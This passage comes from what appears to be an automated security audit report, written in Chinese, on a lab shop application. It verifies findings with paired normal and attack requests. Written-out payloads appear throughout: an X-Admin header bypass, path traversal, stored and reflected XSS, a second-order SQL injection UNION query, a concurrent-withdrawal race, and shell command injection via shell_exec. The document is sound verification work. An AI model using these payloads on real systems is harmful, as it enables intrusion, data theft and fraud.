- 正式复核 `a5188b9dcca8491e8856eef2021376f8`：复核确认；引用 revision 1 / verification `321c1c5ebdfa4b6eb8458025e6c452b4`
  - 理由：正常侧无会话 guest（先访问 /orders/index.php 得 401 证明无会话）不带 X-Admin 头时 GET/POST 均 403 并提示“内部维护接口需要有效的服务身份。”；operator 基线 /ops/jobs.php 仅有 385 已完成任务。攻击侧仅添加 X-Admin: 1 后 GET 200 {"service":"settlement-maintenance","authorized":true}、POST 200 {"accepted":true,"job_id":386}；operator 读回页面显示新增 386 &#124; 系统对账 &#124; queued &#124; 维护接口发起。与 maintenance.php:3-4 仅信任客户端头即写 jobs 的静态结论一致，动态确认未认证写入成立。限制为无直接 SQL 访问、下游执行未测，不影响本项授权绕过结论。
  - 复核观测：正常侧 guest（无 CookieJar，先访问 /orders/index.php 得 401 证明无会话）：GET /ops/maintenance.php 无头 → 403 页面“内部维护接口需要有效的服务身份。”；POST 无头 → 403。基线 operator GET /ops/jobs.php（200）近期任务表只有 385 &#124; 日常库存同步 &#124; completed。；攻击侧 同一无会话 guest 仅添加请求头 X-Admin: 1：GET /ops/maintenance.php → 200 {"service":"settlement-maintenance","authorized":true}；POST → 200 {"accepted":true,"job_id":386}。随后 operator GET /ops/jobs.php（200）读回：386 &#124; 系统对账 &#124; queued &#124; 维护接口发起（385 仍在下方），确认攻击变量造成了新的持久化任务记录。

### C-03 ops/database.php 归档数据源探测将 PDO 异常堆栈原样回显给运营用户，泄露数据库凭据与服务器路径信息

- verification `2c8534a5c376408ca657fba30ba6c9cf`（finding `0e88b1f8b3d04a0798676aeccba07cf9` revision 1，context `dd71aa8ca96f434ba922cd8cc0844caf`，target lab30-shop-1.0.0）
  - 执行状态：验证实验因模型或运行时异常中断，已保存作业，结论仍未决；判定：不确定；来源：poc_agent
  - 正常侧观测：未记录
  - 攻击侧观测：未记录
  - 结论结束原因：sdk_api_error；执行阶段结束原因：sdk_api_error

- verification `e4141fdd0a1f4adf848e84833e1f6a42`（finding `0e88b1f8b3d04a0798676aeccba07cf9` revision 1，context `4edeed02a938477297e8aafbbca287ef`，target lab30-shop-1.0.0）
  - 执行状态：执行完成；判定：confirmed；来源：poc_agent
  - 正常侧观测：job 00f5aaf64cdf410799de40f4bd867c80（operator，GET /ops/database.php?probe=main，HTTP 200）：<pre>主数据源连接正常。</pre> 无异常类名、无 message、无 trace、无路径。
  - 攻击侧观测：job 68fcea528fa446d0872a57eb02a0d2e9（operator，GET /ops/database.php?probe=archive，HTTP 200）：<pre>PDOException: SQLSTATE[HY000] [1044] Access denied for user 'shop'@'%' to database 'shop_archive_unconfigured'\n#0 /var/www/shop/public/ops/database.php(3): PDO->__construct('mysql:host=lab3...', 'shop', Object(SensitiveParameterValue))\n#1 {main}</pre>（页面中为 HTML 转义形式）。泄露 DB 用户名 shop、库名、host 前缀与源码绝对路径；密码因 SensitiveParameterValue 未显示。
  - 已保存作业事实：4 个；满足执行及前提检查的作业：4 个。作业完成不等同于漏洞成立。
  - 已观测作业 ID：`9efa03854ddb497e9cd3b167b2d9a652`；`818c297f2937452590d63ecc15675df3`；`00f5aaf64cdf410799de40f4bd867c80`；`68fcea528fa446d0872a57eb02a0d2e9`
  - 结论结束原因：completed；执行阶段结束原因：sdk_interrupt_error
  - 作业：`9efa03854ddb497e9cd3b167b2d9a652` http finished exit=0；`818c297f2937452590d63ecc15675df3` http finished exit=0；`00f5aaf64cdf410799de40f4bd867c80` http finished exit=0；`68fcea528fa446d0872a57eb02a0d2e9` http finished exit=0
  - 备注：对照证据：ev-fb10788e44b1d8d1（正常 body）、ev-25de98b268d3f53b（正常 headers）、ev-7862ea485c7d05b5（攻击 body）、ev-6e1132fcf52975b6（攻击 headers）。准入对照：guest job 9efa03854ddb497e9cd3b167b2d9a652 → 401（ev-734370f0f4782f8d），alice job 818c297f2937452590d63ecc15675df3 → 403（ev-a6226e25736a5ce2）。源码快照 app/public/ops/database.php:2-4 与 app/src/bootstrap.php:33-37 与运行结果一致（applicability=match）。

- 正式复核 `a5052fa3385149588e87530cd54e8789`：复核确认；引用 revision 1 / verification `e4141fdd0a1f4adf848e84833e1f6a42`
  - 理由：双侧观测与源码一致：operator 会话 probe=archive（job 68fcea...）HTTP 200，<pre> 实际输出 PDOException、SQLSTATE[HY000] [1044] Access denied for user 'shop'@'%' to database 'shop_archive_unconfigured' 及 #0 /var/www/shop/public/ops/database.php(3) 的 PDO->__construct 堆栈片段，暴露 DB 账号、库名、host 前缀与源码绝对路径；同会话 probe=main（job 00f5aa...）仅“主数据源连接正常。”，guest 401、alice 403 复核准入。密码因 SensitiveParameterValue 未回显，泄露范围限于账号/库名/路径，判别有效，确认源码 catch 拼接回显事实。
  - 复核观测：正常侧 job 00f5aaf64cdf410799de40f4bd867c80（operator，GET /ops/database.php?probe=main，HTTP 200）：<pre>主数据源连接正常。</pre> 无异常类名、无 message、无 trace、无路径。；攻击侧 job 68fcea528fa446d0872a57eb02a0d2e9（operator，GET /ops/database.php?probe=archive，HTTP 200）：<pre>PDOException: SQLSTATE[HY000] [1044] Access denied for user 'shop'@'%' to database 'shop_archive_unconfigured'\n#0 /var/www/shop/public/ops/database.php(3): PDO->__construct('mysql:host=lab3...', 'shop', Object(SensitiveParameterValue))\n#1 {main}</pre>（页面中为 HTML 转义形式）。泄露 DB 用户名 shop、库名、host 前缀与源码绝对路径；…

### C-04 support/download.php file 参数未规范化导致路径穿越任意文件读取

- verification `22f0efa8fd604a078f6ee41ed772b56e`（finding `e158b6a09f1e4f84b85fd03e4eb93c48` revision 1，context `692de2623ea94840b726e49ba80c27f6`，target lab30-shop-1.0.0）
  - 执行状态：执行完成；判定：confirmed；来源：poc_agent
  - 正常侧观测：正常侧独立作业 308e1a7263df46a99d946a613783e6df（alice，HTTP 观测）：GET /support/download.php?file=shipping.txt 返回 200，响应头 content-length: 47、content-type: text/plain; charset=utf-8，正文为 '配送说明：工作日 48 小时内发货。'，仅返回 docs 内文档；宿主脚本作业中 file=shipping.txt 亦返回同一内容。
  - 攻击侧观测：攻击侧（宿主审计执行作业 cb36005c0cdf43fbbc79eebe40ab07db，alice 登录会话）：同一登录会话请求 file=../vault/internal.txt，返回内容为 'SHOP_INTERNAL_382d1a3fce44de4763cb290a'（ATTACK 段原文），即 data_dir()/vault/internal.txt 中的内部标记。该标记由 setup.php:25-26、34 随机生成并只写入 vault/internal.txt（不在 docs 目录、不经页面回显），说明 ../ 穿越目录边界生效；同一脚本 file=shipping.txt 只返回文档内容。
  - 继承验证：原运行 `566a1c802c1e5ef19b153cb5529b1446` / verification `30b513fe8d954103a2997e3b1f18fb88`；本次未重新执行该历史作业。
  - 已保存作业事实：2 个；满足执行及前提检查的作业：2 个。作业完成不等同于漏洞成立。
  - 已观测作业 ID：`cb36005c0cdf43fbbc79eebe40ab07db`；`308e1a7263df46a99d946a613783e6df`
  - 结论结束原因：completed；执行阶段结束原因：未记录
  - 作业：`308e1a7263df46a99d946a613783e6df` http finished exit=0；`cb36005c0cdf43fbbc79eebe40ab07db` script finished exit=0
  - 适配脚本：`22f0efa8-adapted-poc_download_traversal.py`（见证据包 evidence/）
  - 备注：源码窗口 applicability=match：download.php:2 require_user() 仅校验登录；:3 $path=data_dir().'/docs/'.(string)$_GET['file']，仅 is_file 检查后 file_get_contents 并输出，无 basename/realpath/白名单；bootstrap.php:9 data_dir()=/var/lib/shop（compose.yaml:40 SHOP_DATA_DIR）。setup.php:34 将随机 $marker 写入 $root/vault/internal.txt，:36 写入 docs/shipping.txt。正常侧独立作业 308e1a7263df46a99d946a613783e6df 用 alice 读取 shipping.txt 得到 200 text/plain；攻击侧在同一身份下仅改变 file 参数即读到 vault 内随机标记，标记值不可能由请求回显或猜测得到。

- 正式复核 `aa9a2f72e06047ceb8aae0821d510b21`：复核确认；引用 revision 1 / verification `22f0efa8fd604a078f6ee41ed772b56e`
  - 理由：双侧观测判读：正常侧独立 http 作业 308e1a7263df46a99d946a613783e6df 以 alice（customer）GET file=shipping.txt 得 200、content-type text/plain、content-length 47、正文“配送说明：工作日 48 小时内发货。”，只读 docs 内文档；攻击侧脚本作业 cb36005c0cdf43fbbc79eebe40ab07db 同一会话仅把 file 改为 ../vault/internal.txt，stdout 的 ATTACK 段返回 setup.php 随机生成且仅写入 vault/internal.txt 的内部标记 SHOP_INTERNAL_382d1a3fce44de4763cb290a。同一接口、同一会话仅参数不同即读取到 docs 目录外文件，证明 ../ 路径穿越成立，与源码 download.php:3 无规范化校验一致。正常/攻击两侧均有成功作业记录，确认该动态验证。
  - 复核观测：正常侧 正常侧独立作业 308e1a7263df46a99d946a613783e6df（alice，HTTP 观测）：GET /support/download.php?file=shipping.txt 返回 200，响应头 content-length: 47、content-type: text/plain; charset=utf-8，正文为 '配送说明：工作日 48 小时内发货。'，仅返回 docs 内文档；宿主脚本作业中 file=shipping.txt 亦返回同一内容。；攻击侧 攻击侧（宿主审计执行作业 cb36005c0cdf43fbbc79eebe40ab07db，alice 登录会话）：同一登录会话请求 file=../vault/internal.txt，返回内容为 'SHOP_INTERNAL_382d1a3fce44de4763cb290a'（ATTACK 段原文），即 data_dir()/vault/internal.txt 中的内部标记。该标记由 setup.php:25-26、34 随机生成并只写入 vault/internal.txt（不在 docs 目录、不经页面回显），说明 ../ 穿越目录边界生效；同一脚本 file=shipping.txt 只返回文档内容。

### C-05 support/messages.php 留言正文未经 h() 输出导致存储型 XSS

- verification `b6fb1aaba8d44d7b9665d6aec3331fef`（finding `20f1b555e4b648e8b9622864abb3123c` revision 1，context `c4527d6efd764bd7a94e9fac74464551`，target lab30-shop-1.0.0）
  - 执行状态：执行完成；判定：confirmed；来源：poc_agent
  - 正常侧观测：正常侧作业 5a1e3fac6493408ea99ab2c90888162a（bob 浏览器，payload 尚未存储）：访问 /support/messages.php 返回标题“在线留言 · 拾光商城”，dialogs=[]，console_errors=[]，body_text 仅显示既有留言“陈远 2026-11-10 08:03:01 请问帆布包可以机洗吗？”与“林晓 2026-11-10 08:03:01 包装很好，期待下次上新。”，无 PWNED-SXSS-7Q2Z。
  - 攻击侧观测：存储/回读侧：alice 作业 e0e50f625cc94e22ae56287253c924de 用会话 csrf POST message='XSS <img src=x onerror="alert('PWNED-SXSS-7Q2Z')">'，服务端返回 303 See Other（INSERT 后重定向；该作业因未捕获 303 退出码为 1，不作证据）；alice 作业 cb7d342e7a0341e3938391626cb56cca 读回页面，<div class="message-body"> 原始内容为 'XSS <img src=x onerror="alert('PWNED-SXSS-7Q2Z')">'（FIRST_MESSAGE_BODY_RAW），IMG_TAG_RAW_PRESENT True、ESCAPED_LITERAL False，即未编码存储输出。受害者侧浏览器作业 7a26f4e9796c487d95c996a45f9ca23d（bob 会话）打开 /support/messages.php 后 dialogs=["PWNED-SXSS-7Q2Z"]，console_errors 出现 img 404，body_text 中该条留言（林晓 2026-11-10 08:03:54）只剩“XSS ”，<img> 已被浏览器解析执行。
  - 继承验证：原运行 `566a1c802c1e5ef19b153cb5529b1446` / verification `b61ce31fba704b3d8de75e1a1b92369b`；本次未重新执行该历史作业。
  - 已保存作业事实：4 个；满足执行及前提检查的作业：3 个。作业完成不等同于漏洞成立。
  - 已观测作业 ID：`5a1e3fac6493408ea99ab2c90888162a`；`e0e50f625cc94e22ae56287253c924de`；`7a26f4e9796c487d95c996a45f9ca23d`；`cb7d342e7a0341e3938391626cb56cca`
  - 结论结束原因：completed；执行阶段结束原因：未记录
  - 作业：`5a1e3fac6493408ea99ab2c90888162a` browser finished exit=0；`7a26f4e9796c487d95c996a45f9ca23d` browser finished exit=0；`cb7d342e7a0341e3938391626cb56cca` script finished exit=0
  - 产物：`75a88d5f8b41441db908690bdb4aba7a-5a1e3fac6493408ea99ab2c90888162a-screenshot.png`；`75a88d5f8b41441db908690bdb4aba7a-7a26f4e9796c487d95c996a45f9ca23d-screenshot.png`
  - 适配脚本：`b6fb1aab-adapted-poc.php`（见证据包 evidence/）
  - 备注：源码窗口 applicability=match：messages.php:3 校验 csrf/长度后 INSERT；:4 SELECT m.*,u.display_name；:5 '<div class="message-body">'.$row['message'].'</div>' 未用 h()（同页 display_name/created_at 用 h()）。攻击者 alice（id=1）与受害者 bob（id=2）均为 customer，由宿主 target_prepare/作业 precondition 核验。正常侧 bob 浏览器作业 5a1e3fac6493408ea99ab2c90888162a 在 payload 存储前 dialogs=[]，页面只有 fixture 旧留言；攻击侧同一 bob 会话在存储后 dialogs=['PWNED-SXSS-7Q2Z']，差异仅来自新存储的留言内容。持久化证据由 alice 的页面 HTML 原始片段补充。

- 正式复核 `a20e76c9c0d64914bcdd9e802f74a8ba`：复核确认；引用 revision 1 / verification `b6fb1aaba8d44d7b9665d6aec3331fef`
  - 理由：正常侧 bob 作业 5a1e3fac6493408ea99ab2c90888162a 在 payload 未存储时访问 /support/messages.php，dialogs=[] 且 body_text 仅有既有两条 fixture 留言，无 PWNED-SXSS-7Q2Z。攻击侧 alice 作业 cb7d342e7a0341e3938391626cb56cca 读回页面，message-body 内原样保留 <img src=x onerror="alert('PWNED-SXSS-7Q2Z')">，FIRST_MESSAGE_BODY_RAW 与 IMG_TAG_RAW_PRESENT=True、ESCAPED_LITERAL=False；bob 作业 7a26f4e9796c487d95c996a45f9ca23d 打开同一页面后 dialogs=["PWNED-SXSS-7Q2Z"]，body_text 中该条留言仅剩“XSS ”，伴随 img 404。正常与攻击路径、身份与页面一致，仅新增存储内容为变量，脚本执行判据成立；存储 POST 作业 e0e50f625cc94e22ae56287253c924de 因 303 退出码 1 未作证据，不影响结论。局限（未做会话窃取、未清理测试留言）不改变存储型 XSS 的脚本执行事实。
  - 复核观测：正常侧 正常侧作业 5a1e3fac6493408ea99ab2c90888162a（bob 浏览器，payload 尚未存储）：访问 /support/messages.php 返回标题“在线留言 · 拾光商城”，dialogs=[]，console_errors=[]，body_text 仅显示既有留言“陈远 2026-11-10 08:03:01 请问帆布包可以机洗吗？”与“林晓 2026-11-10 08:03:01 包装很好，期待下次上新。”，无 PWNED-SXSS-7Q2Z。；攻击侧 存储/回读侧：alice 作业 e0e50f625cc94e22ae56287253c924de 用会话 csrf POST message='XSS <img src=x onerror="alert('PWNED-SXSS-7Q2Z')">'，服务端返回 303 See Other（INSERT 后重定向；该作业因未捕获 303 退出码为 1，不作证据）；alice 作业 cb7d342e7a0341e3938391626cb56cca 读回页面，<div class="message-body"> 原始内容为 'XSS <img src=x onerror="alert('PWNED-SXSS-7Q2Z')">'（FIRST_MESSAGE_BODY_RAW），IMG_TAG_RAW_PRESENT True、ESCAPED_LITERAL False，即未编码存储输出。受害者侧浏览…

### C-06 商品欢迎页 name 参数未编码输出导致反射型 XSS

- verification `aa177705ed384b73be96fc5185fb4809`（finding `a5707d3ea9bb4b9284ff9f164dbf955d` revision 1，context `d92549c2fd0c43ddb434f9179f066703`，target lab30-shop-1.0.0）
  - 执行状态：执行完成；判定：confirmed；来源：poc_agent
  - 正常侧观测：正常侧浏览器作业 52fc9ffb3a01442e8c8053ac457668b3（guest，fresh 会话）：访问 /catalog/greeting.php?name=%E8%AE%BF%E5%AE%A2%E7%94%B2%E4%B9%99，HTTP 页面标题“到店欢迎 · 拾光商城”，dialogs=[]，console_errors=[]，body_text 含“你好，访客甲乙”，无任何脚本执行。
  - 攻击侧观测：攻击侧浏览器作业 f0bf49db8e6a496ba23469a6f77a636e（guest，会话隔离）：访问 /catalog/greeting.php?name=%3Cscript%3Ealert%28%27PWNED-XSS-7Q2Z%27%29%3C%2Fscript%3E，页面标题仍为“到店欢迎 · 拾光商城”，dialogs=["PWNED-XSS-7Q2Z"]，console_errors 为空；body_text 中该位置只余“你好，”而脚本内容未作为文本显示，说明 <script> 被浏览器解析执行并弹出对话框。screenshot 产物 sha256 63632ae9d950acc3abee5a1ececc28e7f4d1782bd13582a675e2edc84d13d6d2。
  - 继承验证：原运行 `566a1c802c1e5ef19b153cb5529b1446` / verification `a1ba2e1aa52b4f4f8bf45ee836c27629`；本次未重新执行该历史作业。
  - 已保存作业事实：2 个；满足执行及前提检查的作业：2 个。作业完成不等同于漏洞成立。
  - 已观测作业 ID：`52fc9ffb3a01442e8c8053ac457668b3`；`f0bf49db8e6a496ba23469a6f77a636e`
  - 结论结束原因：completed；执行阶段结束原因：未记录
  - 作业：`52fc9ffb3a01442e8c8053ac457668b3` browser finished exit=0；`f0bf49db8e6a496ba23469a6f77a636e` browser finished exit=0
  - 产物：`b483ea88555d41c1a4355c6004d1c5b2-52fc9ffb3a01442e8c8053ac457668b3-screenshot.png`；`b483ea88555d41c1a4355c6004d1c5b2-f0bf49db8e6a496ba23469a6f77a636e-screenshot.png`
  - 备注：源码窗口 applicability=match：greeting.php:2 $name=(string)($_GET['name']??'拾光的朋友')，:3 在 page() 回调中 echo '<h2>你好，'.$name.'</h2>'，未调用 bootstrap.php:10 的 h()。正常与攻击均为未登录 guest、同一路径 /catalog/greeting.php、仅 name 参数不同。攻击侧以浏览器实际弹出的 alert 对话框（dialogs 通道原文 PWNED-XSS-7Q2Z）作为执行证据，非仅 HTTP 反射；body_text 中脚本标签消失而出现“你好，”亦与执行一致。

- 正式复核 `33a18c42472949c0ae26b45f00b26e48`：复核确认；引用 revision 1 / verification `aa177705ed384b73be96fc5185fb4809`
  - 理由：两侧作业原文判读一致且判据明确：正常侧 52fc9ffb…（guest，fresh 会话）访问 name=访客甲乙，dialogs=[]、console_errors=[]、body_text 显示“你好，访客甲乙”；攻击侧 f0bf49db…（guest，同路径同身份）访问 URL 编码的 <script>alert('PWNED-XSS-7Q2Z')</script>，dialogs=["PWNED-XSS-7Q2Z"]，body 该位置仅余“你好，”且脚本文本未残留，说明浏览器解析并执行了注入脚本。两作业 exit_code 0、guest 前置均 ok，差异仅 name 取值，直接印证 greeting.php:3 未转义输出导致的反射型脚本执行，confirmed 成立。
  - 复核观测：正常侧 正常侧浏览器作业 52fc9ffb3a01442e8c8053ac457668b3（guest，fresh 会话）：访问 /catalog/greeting.php?name=%E8%AE%BF%E5%AE%A2%E7%94%B2%E4%B9%99，HTTP 页面标题“到店欢迎 · 拾光商城”，dialogs=[]，console_errors=[]，body_text 含“你好，访客甲乙”，无任何脚本执行。；攻击侧 攻击侧浏览器作业 f0bf49db8e6a496ba23469a6f77a636e（guest，会话隔离）：访问 /catalog/greeting.php?name=%3Cscript%3Ealert%28%27PWNED-XSS-7Q2Z%27%29%3C%2Fscript%3E，页面标题仍为“到店欢迎 · 拾光商城”，dialogs=["PWNED-XSS-7Q2Z"]，console_errors 为空；body_text 中该位置只余“你好，”而脚本内容未作为文本显示，说明 <script> 被浏览器解析执行并弹出对话框。screenshot 产物 sha256 63632ae9d950acc3abee5a1ececc28e7f4d1782bd13582a675e2edc84d13d6d2。

### C-07 ops/report.php 将用户可控 nickname 直接拼入 SQL 导致二次注入

- verification `cb6ce27b445b4dfc8f3cea92565305ec`（finding `6bc2fbecc4be4bf0af206d7c9f717aac` revision 1，context `8786d3ae57204bf3bfb238e88b2a36c9`，target lab30-shop-1.0.0）
  - 执行状态：执行完成；判定：confirmed；来源：poc_agent
  - 正常侧观测：正常侧作业 27955077e75149ecaae646e9c4a104bb（operator）：alice 昵称尚为 alice 时，GET /ops/report.php?user_id=1（Accept: application/json）返回 200，{"saved_nickname":"alice","members":[{"username":"alice","email":"alice@shop.local","role":"customer"}]}，无注入行。
  - 攻击侧观测：注入侧（alice，作业 84b9c39a2b124066a2dbb248d737bc0c）：GET /account/update.php 取得 48 位 csrf 后仅提交 nickname，值为 ' UNION SELECT 'PWNED-SQLI2-7Q2Z', value, 'red' FROM settings WHERE `key`='internal_marker'-- -，响应 200 且“资料已保存。”，读回 input 值为 &#039; UNION SELECT …（READBACK_HAS_PAYLOAD True）。触发侧（operator，作业 4bb672ce19a546aea3a220522daa53ab）：带 Accept: application/json 请求 /ops/report.php?user_id=1，返回 200：{"saved_nickname":"' UNION SELECT 'PWNED-SQLI2-7Q2Z', value, 'red' FROM settings WHERE `key`='internal_marker'-- -","members":[{"username":"PWNED-SQLI2-7Q2Z","email":"SHOP_INTERNAL_84b0c603ccec1a022beb113d","role":"red"}]}，MARKER_ROW 与 SECRET_LEAKED 均为 True；同一请求对 user_id=2（bob，nickname=bob）仍返回 {"saved_nickname":"bob","members":[{"username":"bob","email":"bob@shop.local","role":"customer"}]}，说明差异来自存储的 nickname…
  - 继承验证：原运行 `566a1c802c1e5ef19b153cb5529b1446` / verification `9dde576884c94e78a2cbbb9c16c10205`；本次未重新执行该历史作业。
  - 已保存作业事实：4 个；满足执行及前提检查的作业：4 个。作业完成不等同于漏洞成立。
  - 已观测作业 ID：`27955077e75149ecaae646e9c4a104bb`；`84b9c39a2b124066a2dbb248d737bc0c`；`4bb672ce19a546aea3a220522daa53ab`；`51c94975600e44cd9d3cd3f1e1abbebd`
  - 结论结束原因：completed；执行阶段结束原因：未记录
  - 作业：`27955077e75149ecaae646e9c4a104bb` script finished exit=0；`84b9c39a2b124066a2dbb248d737bc0c` script finished exit=0；`4bb672ce19a546aea3a220522daa53ab` script finished exit=0；`51c94975600e44cd9d3cd3f1e1abbebd` script finished exit=0
  - 适配脚本：`cb6ce27b-adapted-poc.php`（见证据包 evidence/）
  - 备注：源码窗口 applicability=match：update.php:4-6 仅把 nickname 当列白名单字段、值 (string) 强转后参数化写入 users；report.php:2 以占位符按 user_id 读 nickname，:3 用 "SELECT username,email,role FROM users WHERE nickname='".$nickname."'" 直接 db()->query 拼接。two-role 设计：alice(customer, id=1) 为注入者，operator(id=3) 为触发报表的受害者，二者身份均由宿主 target_prepare 与作业 precondition 核验。操作顺序：operator 正常基线（27955077）→ alice 写入 payload（84b9c39a）→ operator 读取（4bb672ce）→ alice 恢复 nickname=alice（51c94975，读回 alice）。

- 正式复核 `b6fe64ca4e774dab9d2f1cfedf29604a`：复核确认；引用 revision 1 / verification `cb6ce27b445b4dfc8f3cea92565305ec`
  - 理由：双侧观测完整且判别明确：正常侧（作业 27955077e75149ecaae646e9c4a104bb）operator 访问 /ops/report.php?user_id=1 返回 saved_nickname=alice、members=[alice/customer]；攻击侧（作业 84b9c39a2b124066a2dbb248d737bc0c 写入载荷、4bb672ce19a546aea3a220522daa53ab 触发）同一接口返回 members=[{username:PWNED-SQLI2-7Q2Z, email:SHOP_INTERNAL_84b0c603ccec1a022beb113d, role:red}]，SECRET_LEAKED True，而 user_id=2（bob）保持正常行，差异仅由存储的 nickname 内容驱动，可确认拼接入 SQL 的执行路径；测试后 nickname 已恢复（作业 51c94975600e44cd9d3cd3f1e1abbebd），无状态残留。
  - 复核观测：正常侧 正常侧作业 27955077e75149ecaae646e9c4a104bb（operator）：alice 昵称尚为 alice 时，GET /ops/report.php?user_id=1（Accept: application/json）返回 200，{"saved_nickname":"alice","members":[{"username":"alice","email":"alice@shop.local","role":"customer"}]}，无注入行。；攻击侧 注入侧（alice，作业 84b9c39a2b124066a2dbb248d737bc0c）：GET /account/update.php 取得 48 位 csrf 后仅提交 nickname，值为 ' UNION SELECT 'PWNED-SQLI2-7Q2Z', value, 'red' FROM settings WHERE `key`='internal_marker'-- -，响应 200 且“资料已保存。”，读回 input 值为 &#039; UNION SELECT …（READBACK_HAS_PAYLOAD True）。触发侧（operator，作业 4bb672ce19a546aea3a220522daa53ab）：带 Accept: application/json 请求 /ops/report.php?user_id=1，返回 200：{"saved_nick…

### C-08 钱包提现余额检查与扣减非原子，存在并发竞态透支

- verification `70f5d025a4dd43e9b5f0da9adff292ed`（finding `61e9d885a7434e17a86e04f517471730` revision 1，context `4a815040d35943d2a3f7786733f587d3`，target lab30-shop-1.0.0）
  - 执行状态：执行完成；判定：confirmed；来源：poc_agent
  - 正常侧观测：alice 登录后 GET /wallet/index.php 取得真实 csrf，基线 {"balance":"100.00","withdrawals":[],"withdrawn_total":0}；单次 POST /wallet/withdraw.php amount=1 返回 200 {"status":"paid","amount":1,"balance":99,"receipt_id":1}，读回 balance 99.00、1 条 1.00 记录、withdrawn_total 1（job 187114cede0d48c7930cbdcf4b3e8ebd，exit 0）。
  - 攻击侧观测：alice 在同一会话下，以当前余额 99.00 为 amount，用同一 csrf 由两线程经 Barrier 同时 POST /wallet/withdraw.php：两个请求均返回 200，分别 {"status":"paid","amount":99,"balance":0,"receipt_id":3} 与 {"status":"paid","amount":99,"balance":0,"receipt_id":2}，耗时约 0.36s。随后读回 {"balance":"0.00","withdrawn_total":199}，withdrawals 含两条 99.00 记录（id 3、2）与正常对照的 1.00 记录（id 1），即从初始 100.00 余额累计提取 199.00（job 0328dd0930d94d76ba931bd8918ba83d，exit 0）。
  - 继承验证：原运行 `566a1c802c1e5ef19b153cb5529b1446` / verification `410396ed65c24b4081ccb4ec9e4138e8`；本次未重新执行该历史作业。
  - 已保存作业事实：3 个；满足执行及前提检查的作业：3 个。作业完成不等同于漏洞成立。
  - 已观测作业 ID：`187114cede0d48c7930cbdcf4b3e8ebd`；`6593a8332e734dc19af274f9e3b28b36`；`0328dd0930d94d76ba931bd8918ba83d`
  - 结论结束原因：completed；执行阶段结束原因：未记录
  - 作业：`187114cede0d48c7930cbdcf4b3e8ebd` script finished exit=0；`0328dd0930d94d76ba931bd8918ba83d` script finished exit=0
  - 适配脚本：`70f5d025-adapted-poc.php`（见证据包 evidence/）
  - 备注：正常与攻击两侧均为 alice 身份、同一上下文，precondition ok=true。job 6593a8332e734dc19af274f9e3b28b36（ATTACK_WITHDRAW 401）因自建每线程 CookieJar 未携带会话 cookie 而失败，未改变余额，不计入本 experiment 的两侧作业，仅说明攻击路径是以共享会话 cookie 的并发请求复现的。攻击后 alice 余额 0.00，未复位（无可用的合法充值入口）。

- 正式复核 `f1f24166bb1b41289ff9ef7eaa4a8b05`：复核确认；引用 revision 1 / verification `70f5d025a4dd43e9b5f0da9adff292ed`
  - 理由：正常侧 job 187114cede0d48c7930cbdcf4b3e8ebd：单笔 amount=1 返回 paid，余额 100.00→99.00，一条 1.00 记录，符合原子预期。攻击侧 job 0328dd0930d94d76ba931bd8918ba83d：余额 99.00 时同会话同 CSRF 并发两笔 amount=99，两请求均 200 paid（receipt 2、3），读回 balance 0.00、withdrawn_total 199、三条记录，超出初始余额 99.00，与 withdraw.php:4-7 读改写非原子一致，判别器有效。job 6593a8332e734dc19af274f9e3b28b36 因 CookieJar 未带会话返回 401，为环境失败未计入。观测支持竞态成立。
  - 复核观测：正常侧 alice 登录后 GET /wallet/index.php 取得真实 csrf，基线 {"balance":"100.00","withdrawals":[],"withdrawn_total":0}；单次 POST /wallet/withdraw.php amount=1 返回 200 {"status":"paid","amount":1,"balance":99,"receipt_id":1}，读回 balance 99.00、1 条 1.00 记录、withdrawn_total 1（job 187114cede0d48c7930cbdcf4b3e8ebd，exit 0）。；攻击侧 alice 在同一会话下，以当前余额 99.00 为 amount，用同一 csrf 由两线程经 Barrier 同时 POST /wallet/withdraw.php：两个请求均返回 200，分别 {"status":"paid","amount":99,"balance":0,"receipt_id":3} 与 {"status":"paid","amount":99,"balance":0,"receipt_id":2}，耗时约 0.36s。随后读回 {"balance":"0.00","withdrawn_total":199}，withdrawals 含两条 99.00 记录（id 3、2）与正常对照的 1.00 记录（id 1），即从初始 100.00 余额累计提取 199.00（job 0328dd0930d94d76ba931bd8918ba83d，exit 0）。

### C-09 ops/batch-check.php 将 GET 参数 host 未转义拼入 shell_exec，operator 账号可执行任意系统命令

- verification `ccc52153a88e4dd5b4ef601b6d70ef19`（finding `264e0609408a450888c4851f4d477be1` revision 1，context `7248e8ad108c4e1b9a3789dd9ce064f8`，target lab30-shop-1.0.0）
  - 执行状态：执行完成；判定：confirmed；来源：poc_agent
  - 正常侧观测：GET /ops/batch-check.php?host=127.0.0.1（operator 会话）返回 200，<pre> 内容仅为 ping 127.0.0.1 的正常统计信息（1 packets transmitted, 1 received），不含注入标记 POC_MARK_9f3a2b。
  - 攻击侧观测：GET /ops/batch-check.php?host=127.0.0.1%3B%20echo%20POC_MARK_9f3a2b%3B%20id（同一 operator 会话）返回 200，<pre> 在 ping 统计后额外输出 "POC_MARK_9f3a2b" 与 "uid=33(www-data) gid=33(www-data) groups=33(www-data)"，即注入的 echo/id 命令被执行并回显；MARKER_IN_NORMAL_PRE=False，MARKER_IN_ATTACK_PRE=True。
  - 已保存作业事实：1 个；满足执行及前提检查的作业：1 个。作业完成不等同于漏洞成立。
  - 已观测作业 ID：`a14ea621434b4067a9a55ace9d9339b6`
  - 结论结束原因：completed；执行阶段结束原因：sdk_interrupt_error
  - 作业：`a14ea621434b4067a9a55ace9d9339b6` script finished exit=0
  - 适配脚本：`ccc52153-adapted-poc.php`（见证据包 evidence/）
  - 备注：作业 a14ea621434b4067a9a55ace9d9339b6 在同一 operator 会话中先执行正常请求再执行注入请求，stdout 原文同时包含两侧输出（NORMAL_* / ATTACK_*），证据引用 ev-41a87ba1c737431b。服务端身份 id=3/operator 由 run_poc 的 precondition/postcondition 校验。

- 正式复核 `1a14d27bf1604ad6bbd95bf881213960`：复核确认；引用 revision 1 / verification `ccc52153a88e4dd5b4ef601b6d70ef19`
  - 理由：同一 operator 作业 a14ea6... 内：正常 host=127.0.0.1 侧 <pre> 仅有 ping 统计，无注入标记（MARKER_IN_NORMAL_PRE=False）；攻击 host='127.0.0.1; echo POC_MARK_9f3a2b; id' 侧 <pre> 在 ping 统计后额外出现 POC_MARK_9f3a2b 与 uid=33(www-data) gid=33(www-data)（MARKER_IN_ATTACK_PRE=True），证明 host 参数被 shell 解释执行，与 host_check.php:2 shell_exec 拼接源码一致，命令注入确认。
